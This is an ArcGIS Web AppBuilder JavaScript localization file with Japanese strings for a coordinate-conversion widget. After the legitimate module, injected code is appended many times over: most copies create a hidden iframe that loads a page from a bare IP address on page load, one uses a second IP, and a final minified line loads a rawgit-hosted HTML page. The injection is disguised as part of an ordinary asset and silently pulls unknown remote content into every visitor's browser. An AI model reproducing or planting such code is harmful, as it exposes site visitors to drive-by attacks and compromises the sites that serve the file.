// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CoordinateConversion/nls/strings":{_widgetLabel:"\u5ea7\u6a19\u5909\u63db",DD:"DD",DDM:"DDM",DMS:"DMS",DDRev:"DDRev",DDMRev:"DDMRev",DMSRev:"DMSRev",USNG:"USNG",MGRS:"MGRS",UTM_H:"UTM (H)",UTM:"UTM",GARS:"GARS",GEOREF:"GEOREF",DDLatLongNotation:"\u5ea6 (10\u9032) - \u7def\u5ea6/\u7d4c\u5ea6",DDLongLatNotation:"\u5ea6 (10\u9032) - \u7d4c\u5ea6/\u7def\u5ea6",DDMLatLongNotation:"\u5ea6\u5206 (10\u9032) - \u7def\u5ea6/\u7d4c\u5ea6",DDMLongLatNotation:"\u5ea6\u5206 (10\u9032) - \u7d4c\u5ea6/\u7def\u5ea6",
DMSLatLongNotation:"\u5ea6\u5206\u79d2 - \u7def\u5ea6/\u7d4c\u5ea6",DMSLongLatNotation:"\u5ea6\u5206\u79d2 - \u7d4c\u5ea6/\u7def\u5ea6",GARSNotation:"GARS",GEOREFNotation:"GEOREF",MGRSNotation:"MGRS",USNGNotation:"USNG",UTMBandNotation:"UTM - \u30d0\u30f3\u30c9\u6587\u5b57",UTMHemNotation:"UTM - \u534a\u7403 (N/S)",formatInput:"\u5165\u529b\u306e\u66f8\u5f0f\u8a2d\u5b9a",copyAll:"\u3059\u3079\u3066\u30b3\u30d4\u30fc",copySuccessful:"\u30b3\u30d4\u30fc\u306b\u6210\u529f\u3057\u307e\u3057\u305f",copyFailed:"\u30b3\u30d4\u30fc\u3067\u304d\u307e\u305b\u3093\u3002 \u4ee3\u66ff\u64cd\u4f5c\u3068\u3057\u3066 Ctrl + C \u30ad\u30fc\u3092\u4f7f\u7528\u3057\u3066\u304f\u3060\u3055\u3044\u3002",
parseCoordinatesError:"\u5ea7\u6a19\u3092\u89e3\u6790\u3067\u304d\u307e\u305b\u3093\u3002 \u5165\u529b\u3092\u78ba\u8a8d\u3057\u3066\u304f\u3060\u3055\u3044\u3002",comfirmInputNotation:"\u5165\u529b\u8868\u8a18\u306e\u78ba\u8a8d",latLongWarningMessage:"\u5165\u529b\u5ea7\u6a19\u306f\u3001\u7def\u5ea6\u3068\u7d4c\u5ea6\u306e\u5024\u306b\u63a5\u982d\u8f9e\u3068\u63a5\u5c3e\u8f9e\u304c\u4ed8\u3044\u3066\u3044\u308b\u3053\u3068\u304c\u691c\u51fa\u3055\u308c\u307e\u3057\u305f\u3002\u8fd4\u3055\u308c\u308b\u5ea7\u6a19\u306f\u3001\u63a5\u982d\u8f9e\u306b\u57fa\u3065\u3044\u3066\u3044\u307e\u3059\u3002",
inputLabel:"\u5165\u529b",outputLabel:"\u51fa\u529b",cancelButtonLabel:"\u30ad\u30e3\u30f3\u30bb\u30eb",applyButtonLabel:"\u9069\u7528",posNegPrefixLabel:'\u6b63\u3068\u8ca0\u306e\u6570\u5024\u306b "+/-" \u306e\u63a5\u982d\u8f9e\u3092\u8ffd\u52a0',editCoordinateDialogTitle:"\u5ea7\u6a19\u5f62\u5f0f\u306e\u6587\u5b57\u5217\u306e\u8a2d\u5b9a",rememberDecisionLabel:"\u9078\u629e\u5185\u5bb9\u3092\u8a18\u61b6\u3057\u3066\u3001\u4eca\u5f8c\u3053\u306e\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u8868\u793a\u3057\u307e\u305b\u3093\u3002\x3cbr/\x3e",
coordinateInputLabel:"\u5ea7\u6a19\u3092\u5165\u529b\u3059\u308b\u304b\u3001\u30de\u30c3\u30d7\u3092\u30af\u30ea\u30c3\u30af",zoomLabel:"\u30ba\u30fc\u30e0",multipleNotationLabel:"\u5165\u529b\u3068\u4e00\u81f4\u3059\u308b\u8868\u8a18\u304c\u898b\u3064\u304b\u308a\u307e\u3057\u305f\u3002 \u4f7f\u7528\u3059\u308b\u5185\u5bb9\u3092\u78ba\u8a8d\u3057\u3066\u304f\u3060\u3055\u3044\u3002",copyToClipboard:"\u30af\u30ea\u30c3\u30d7\u30dc\u30fc\u30c9\u306b\u30b3\u30d4\u30fc",formatOutput:"\u51fa\u529b\u306e\u66f8\u5f0f\u8a2d\u5b9a",
addNewNotation:"\u65b0\u3057\u3044\u8868\u8a18\u306e\u8ffd\u52a0",notationAddedMessage:"\u8ffd\u52a0\u3055\u308c\u305f\u65b0\u3057\u3044\u8868\u8a18",addLabel:"\u8ffd\u52a0",removeCoordinate:"\u5ea7\u6a19\u306e\u524a\u9664",expandOutput:"\u51fa\u529b\u306e\u5c55\u958b",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});